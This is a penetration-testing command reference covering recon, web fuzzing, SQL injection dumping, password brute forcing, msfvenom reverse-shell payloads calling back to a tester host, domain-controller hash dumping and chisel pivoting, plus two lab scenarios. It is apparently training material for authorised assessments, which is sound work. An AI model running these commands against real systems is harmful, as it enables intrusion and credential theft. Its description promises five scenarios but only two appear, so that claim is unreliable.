---
title: Security Tools Command Matrix & Assessment Scenarios
description: Comprehensive operational workbench cataloging 25+ essential security tools across assessment phases with five end-to-end scenario walkthroughs.
---

This matrix organizes core security utilities across operational assessment phases: **Reconnaissance &rarr; Web Application Auditing &rarr; Credential Recovery &rarr; Exploitation &rarr; Privilege Escalation &rarr; Pivoting & Network Forensics**.

---

## Tool Master Matrix

| Category | Primary Tools | Key Functionality |
| :--- | :--- | :--- |
| **Reconnaissance** | `nmap`, `whatweb`, `dig`, `whois` | Host discovery, port sweeping, DNS profiling & technology fingerprinting |
| **Web Auditing** | `ffuf`, `gobuster`, `sqlmap`, `nikto` | Directory fuzzing, SQL injection automation, CMS audits & header inspection |
| **Credentials** | `hydra`, `hashcat`, `john`, `hashid` | Online login verification, GPU/CPU hash recovery & algorithm identification |
| **Exploitation** | `msfconsole`, `msfvenom`, `searchsploit`, `nc`, `socat` | Exploit modules, payload generation, reverse listeners & PTY handlers |
| **PrivEsc & Post-Ex** | `linpeas`, `winpeas`, `pspy`, `impacket` | Automated configuration audits, cron snooping & Active Directory triage |
| **Pivoting & Traffic** | `chisel`, `proxychains`, `tcpdump`, `wireshark` | SOCKS5 reverse tunneling, port forwarding & deep packet protocol analysis |

---

## Master Command Index by Operational Phase

### 1. Reconnaissance & Surface Discovery

```bash
# 1. Fast ICMP ping sweep to identify live hosts on subnet
nmap -sn 192.168.1.0/24 -oN live_hosts.txt

# 2. Comprehensive SYN stealth scan with version detection and default NSE scripts
nmap -sS -sV -sC -p- -T4 --min-rate 1000 -oA full_scan 192.168.1.10

# 3. Targeted UDP scan for common network services (DNS, SNMP, TFTP, DHCP)
sudo nmap -sU --top-ports 100 192.168.1.10

# 4. Web server technology fingerprinting
whatweb -v -a 3 http://192.168.1.10

# 5. Authoritative DNS record query and zone transfer check
dig target.internal.lab ANY +noall +answer
dig axfr @ns1.target.internal.lab target.internal.lab
```

### 2. Web Application Assessment & Injection

```bash
# 1. High-speed directory and file endpoint fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.1.10/FUZZ -mc 200,301,302 -c -v

# 2. Virtual host (VHost) fuzzing for unlinked subdomains
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://192.168.1.10/ -H "Host: FUZZ.target.internal.lab" -fs 178

# 3. Automated SQL Injection vulnerability verification and database schema discovery
sqlmap -u "http://192.168.1.10/product.php?id=1" --batch --dbs

# 4. Dumping specific table contents from identified database
sqlmap -u "http://192.168.1.10/product.php?id=1" -D app_db -T users --dump
```

### 3. Credential Auditing & Hash Recovery

```bash
# 1. Multi-threaded dictionary authentication testing against SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10 -t 4 -f

# 2. Web form POST brute force with failure pattern
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=invalid password" -f

# 3. Identify hash algorithm from digest
hashid "$6$5pB5.wKz$..."

# 4. Offline dictionary attack with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hashes.txt
john --show hashes.txt
```

### 4. Exploitation, Payloads & Listeners

```bash
# 1. Search local Exploit-DB by software and version
searchsploit "vsftpd 2.3.4"
searchsploit -m unix/remote/49757.py

# 2. Generate staged Linux x64 reverse shell ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.25 LPORT=4444 -f elf -o shell.elf

# 3. Generate Windows x64 stageless reverse shell executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.25 LPORT=4444 -f exe -o implant.exe

# 4. Start Netcat listener with numeric IP resolution
nc -lvnp 4444

# 5. Start Socat fully interactive TTY listener directly
socat file:`tty`,raw,echo=0 TCP-L:4444
```

### 5. Privilege Escalation & Internal Triage

```bash
# 1. Discover SUID root binaries on Linux filesystem
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# 2. Check current user sudo rights without password
sudo -l

# 3. Real-time cron job and unprivileged process monitoring without root
chmod +x pspy64 && ./pspy64 -pf -i 1000

# 4. Dump Active Directory NTDS.dit password hashes via Impacket
secretsdump.py corp.local/admin:Password123@10.10.10.150 -just-dc-ntlm
```

### 6. Network Pivoting & Tunneling

```bash
# 1. Start Chisel reverse SOCKS5 server on tester machine
./chisel server -p 8000 --reverse

# 2. Connect from compromised internal pivot host back to tester
./chisel client 10.10.14.25:8000 R:1080:socks

# 3. Route any CLI tool through SOCKS5 proxy via Proxychains
proxychains nmap -sT -Pn -p 22,80,445 172.16.1.15

# 4. Dynamic SSH SOCKS proxy on local port 9050
ssh -D 9050 -N -C user@192.168.1.10
```

---

## Real-World Educational Assessment Scenarios

### Scenario 1: Black-Box Web Application Compromise to Root
1. **Network Scoping & Discovery:** Run `nmap -sS -sV -sC -T4 -p 21,22,80,445 10.10.110.45` to locate open services.
2. **Web Endpoint Fuzzing:** Execute `ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.110.45/FUZZ -mc 200,301` to reveal `/admin/` and `/product.php?id=1`.
3. **Database Injection:** Run `sqlmap -u "http://10.10.110.45/product.php?id=1" -D app_db -T accounts --dump` to extract user hashes.
4. **Initial Foothold:** Connect via SSH `ssh admin@10.10.110.45` using recovered credentials.
5. **Local Privilege Escalation:** Audit SUID binaries (`find / -perm -4000 -type f 2>/dev/null`). Discover vulnerable SUID binary and escalate to `root`.

### Scenario 2: Active Directory Kerberoasting in Educational Lab
1. **Domain User Enumeration:** Enumerate user accounts using `rpcclient -U "" -N 10.10.10.150 -c "enumdomusers"`.
2. **Request Service Tickets (SPNs):** Execute `GetUserSPNs.py corp.local/labuser:Pass123 -dc-ip 10.10.10.150 -request` to pull TGS tickets.
3. **Offline Ticket Auditing:** Crack Kerberos TGS hash offline with Hashcat: `hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt`.
4. **Domain Compromise:** Utilize recovered service account credentials to access administrative shares via `smbclient.py`.
